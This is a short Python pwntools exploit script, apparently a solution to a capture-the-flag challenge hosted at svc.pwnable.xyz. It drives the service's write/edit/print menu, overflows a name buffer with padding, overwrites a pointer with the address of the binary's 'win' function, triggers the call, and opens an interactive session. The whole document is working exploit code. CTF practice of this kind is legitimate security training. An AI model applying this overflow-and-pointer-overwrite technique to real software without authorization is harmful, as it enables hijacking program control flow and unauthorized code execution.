from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30023)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def write(name):
	sa('>','1')
	sa(':',name)

def edit(idx,name):
	sa('>','2')
	sa(':',str(idx))
	sa(':',name)

def print_name(idx):
	sa('>','3')
	sa(':',str(idx))

write('A'*32)
edit(0,'A'*33)
edit(0,'A'*40 + p64(e.symbols['win']))
print_name(0)

p.interactive()